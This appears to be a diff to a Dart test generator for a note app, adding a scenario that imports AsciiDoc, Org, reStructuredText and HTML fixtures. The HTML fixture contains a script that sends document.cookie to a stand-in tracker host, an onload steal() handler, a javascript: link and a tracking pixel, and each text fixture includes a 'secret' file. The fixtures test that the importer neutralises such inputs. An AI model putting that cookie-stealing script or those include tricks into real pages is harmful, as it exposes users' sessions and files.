@@ -206,6 +206,24 @@ final _scenarios = <Scenario>[
     },
   ),
   (
+    name: 'import-formats',
+    about:
+        'An Import of documents of other tools (#348, ADR 0036): AsciiDoc, '
+        'Org, reStructuredText and HTML, each with parts the Markdown subset '
+        'has and parts it lacks, kept as written, an include, a script, a '
+        'style and an image among them; a page whose title is its file\'s '
+        'name; extensions in capitals and of every kind; a Markdown file '
+        'beside them and a file of another kind, skipped.',
+    build: (store) {
+      _imported = [
+        Imports(store).folder('From Documents', [
+          for (final (name, at, text) in _documents)
+            ImportFile(name, at, _bytesOf(text)),
+        ]),
+      ];
+    },
+  ),
+  (
     name: 'keep',
     about:
         'The import from Google Keep (ADR 0036): a Takeout of a note with a '
@@ -5550,6 +5568,187 @@ const _keepPng = [
   0x0a, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00, //
   0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00, 0x00, 0x00, 0x00, 0x49, //
   0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82, //
+];
+
+/// The documents the `import-formats` scenario imports, as an app hands
+/// them over: each its name, when it was last changed and its text.
+final _documents = <(String, DateTime?, String)>[
+  (
+    'Garden notes.adoc',
+    DateTime.utc(2025, 4, 2, 7, 15),
+    '= Garden notes\n'
+        ':author: Ada\n'
+        '\n'
+        '== Planting\n'
+        'Plant *tomatoes* and _basil_ in `bed 2`, see '
+        'https://example.org/garden_plan[the plan^].\n'
+        'Water **every**morning +\n'
+        'and [.line-through]#never# at noon, Grüße 😀.\n'
+        '\n'
+        '* Seeds\n'
+        '** Carrots\n'
+        '. First\n'
+        '. Second\n'
+        '\n'
+        '[source,python]\n'
+        '----\n'
+        'print("**not bold**")\n'
+        '----\n'
+        '\n'
+        '____\n'
+        'A quote with *bold*.\n'
+        '____\n'
+        '\n'
+        'include::secret.adoc[]\n'
+        'image::https://example.org/photo.png[A photo]\n'
+        '\n'
+        'NOTE: Keep the hose coiled.\n'
+        '\n'
+        '|===\n'
+        '|Plant |Month\n'
+        '\n'
+        '|Tomato\n'
+        '|May\n'
+        '|Basil |June\n'
+        '|===\n'
+        '\n'
+        '=== Deeper\n'
+        '// a comment\n',
+  ),
+  (
+    'week.org',
+    DateTime.utc(2025, 4, 2, 7, 15),
+    '#+TITLE: Week plan\n'
+        '#+AUTHOR: Ada\n'
+        '* TODO Shopping :errands:\n'
+        '  - milk and *butter*\n'
+        '  - [ ] /fresh/ bread\n'
+        '    - rye\n'
+        '  1. first\n'
+        '  2) second\n'
+        '** Notes\n'
+        'Call =Bob= about the +old+ ~car~, see '
+        '[[https://example.org/a_b][the page]] or [[file:other.org][other]].\n'
+        '*** Deeper heading\n'
+        ':PROPERTIES:\n'
+        ':ID: 1234\n'
+        ':END:\n'
+        '#+BEGIN_SRC shell\n'
+        '  echo "hi"\n'
+        '  ,* not a heading\n'
+        '#+END_SRC\n'
+        '#+begin_quote\n'
+        'Be kind.\n'
+        '#+end_quote\n'
+        '#+INCLUDE: "secret.org"\n'
+        '| Name | Age |\n'
+        '|------+-----|\n'
+        '| Ann  | 3   |\n'
+        '# a comment\n'
+        '_underlined_ line\\\\\n'
+        'https://example.org/x_y is bare.\n',
+  ),
+  (
+    'Recipes.rst',
+    DateTime.utc(2025, 1, 20, 18),
+    '==========\n'
+        'Recipes\n'
+        '==========\n'
+        '\n'
+        'Soup 🍲\n'
+        '======\n'
+        '\n'
+        'Cut **onions** and *carrots*, use ``salt``. See '
+        '`the site <https://example.org/soup>`_ or `Notes`_.\n'
+        '\n'
+        '- one\n'
+        '- two\n'
+        '\n'
+        '  - deep\n'
+        '\n'
+        '#. auto\n'
+        '#. auto again\n'
+        '\n'
+        'Example::\n'
+        '\n'
+        '    print("x")\n'
+        '\n'
+        '.. code-block:: python\n'
+        '   :linenos:\n'
+        '\n'
+        '   def f():\n'
+        '       return 1\n'
+        '\n'
+        '.. include:: secret.rst\n'
+        '.. note:: Keep warm.\n'
+        '\n'
+        'Küche\n'
+        '-----\n'
+        '\n'
+        'Third level\n'
+        '~~~~~~~~~~~\n'
+        '\n'
+        '+------+-----+\n'
+        '| Name | Qty |\n'
+        '+======+=====+\n'
+        '| Egg  | 2   |\n'
+        '+------+-----+\n'
+        '\n'
+        ':Author: Ada\n'
+        'Escaped \\*star\\* and :role:`text`.\n',
+  ),
+  (
+    'Trip.HTML',
+    DateTime.utc(2024, 12, 24, 16, 30),
+    '<!DOCTYPE html>\n'
+        '<html><head><title>Trip &amp; tour</title>'
+        '<style>p { color: red }</style>\n'
+        '<script>fetch("https://tracker.example/?" + document.cookie)</script>'
+        '</head>\n'
+        '<body onload="steal()">\n'
+        '<h1>Trip   <em>north</em></h1>\n'
+        '<p>Pack <b>boots </b>and <a href="https://example.org/?a=1&amp;b=2">'
+        'the map</a>, not <a href="javascript:steal()">this</a>.<br>'
+        'Costs &euro; 12 &copy; &#x1F600; &bogus;</p>\n'
+        '<!-- a comment -->\n'
+        '<ul><li>Socks<ul><li>Wool</li></ul></li><li><p>Hat</p></li></ul>\n'
+        '<ol start="3"><li>Three</li><li>Four</li></ol>\n'
+        '<blockquote><p>Quoted *stars*</p></blockquote>\n'
+        '<pre><code class="language-sh">ls -l\n  cd ~\n</code></pre>\n'
+        '<table><tr><th>Day</th><th>A|B</th></tr>'
+        '<tr><td>1</td><td><code>x|y</code></td></tr></table>\n'
+        '<h3>Small heading</h3>\n'
+        '<img src="https://tracker.example/pixel.png" alt="A fjord">\n'
+        '<div>one</div><div>two <s>gone</s></div>\n'
+        '</body></html>\n',
+  ),
+  ('Packing.htm', null, '<title>Packing</title><p>Socks</p>'),
+  (
+    'Old notes.asciidoc',
+    DateTime.utc(2024, 12, 24, 16, 30),
+    'A line with a #hashtag and *bold*.\n',
+  ),
+  ('key.ASC', DateTime.utc(2024, 3, 1), '-----BEGIN NOTE-----\nplain\n'),
+  ('Plain.md', DateTime.utc(2025, 2, 2), '# Plain\n*kept* as written\n'),
+  ('slides.pdf', DateTime.utc(2025, 2, 2), '%PDF-1.4'),
+];
+
+/// What the cores read each of [_documents] as, in the order handed
+/// over: the title and the Markdown of each document of another tool.
+List<Map<String, Object?>> _documentsRead() => [
+  for (final (name, at, text) in _documents)
+    {
+      'modified': at?.toIso8601String(),
+      'name': name,
+      if (ImportFormats.ofExtension(
+            name.substring(name.lastIndexOf('.') + 1).toLowerCase(),
+          )
+          case final format?)
+        'read': {
+          'text': ImportFormats.read(format, text).text,
+          'title': ImportFormats.read(format, text).title,
+        },
+    },
 ];
 
 /// The folder the `import` scenario imports, as an app hands it over.
@@ -11474,6 +11673,12 @@ Future<void> main(List<String> args) async {
     'made it and whether this Device may use its text again.\n'
     '- `import/import.json`: what each Import of the `import` log came to '
     '(ADR 0036): the Area made, the Notes made and the files skipped.\n'
+    '- `import-formats/`: the documents the Import of its log took, as '
+    'they lie in a folder (`inputs/`), and for each, in the order handed '
+    'over, its name, when it was last changed and, for AsciiDoc, Org, '
+    'reStructuredText and HTML, the title and the Markdown the core reads '
+    'it as (`documents.json`, #348); `import-formats.json` what the Import '
+    'came to.\n'
     '- `keep/keep.json`: the same of the import from Google Keep of the '
     '`keep` log: the Area made, the Notes, Checklists and photos made, '
     'and what was skipped, by reason.\n'
@@ -11947,7 +12152,20 @@ Future<void> main(List<String> args) async {
           '${_json.convert(_noteHistory(store))}\n',
         );
       }
-      if (scenario.name == 'import' || scenario.name == 'keep') {
+      if (scenario.name == 'import-formats') {
+        for (final (name, _, text) in _documents) {
+          File('${out.path}/inputs/$name')
+            ..parent.createSync(recursive: true)
+            ..writeAsBytesSync(_bytesOf(text));
+        }
+        _write(
+          File('${out.path}/documents.json'),
+          '${_json.convert({'documents': _documentsRead()})}\n',
+        );
+      }
+      if (scenario.name == 'import' ||
+          scenario.name == 'import-formats' ||
+          scenario.name == 'keep') {
         _write(
           File('${out.path}/${scenario.name}.json'),
           '${_json.convert({'imports': _imported.map(_summary).toList()})}\n',
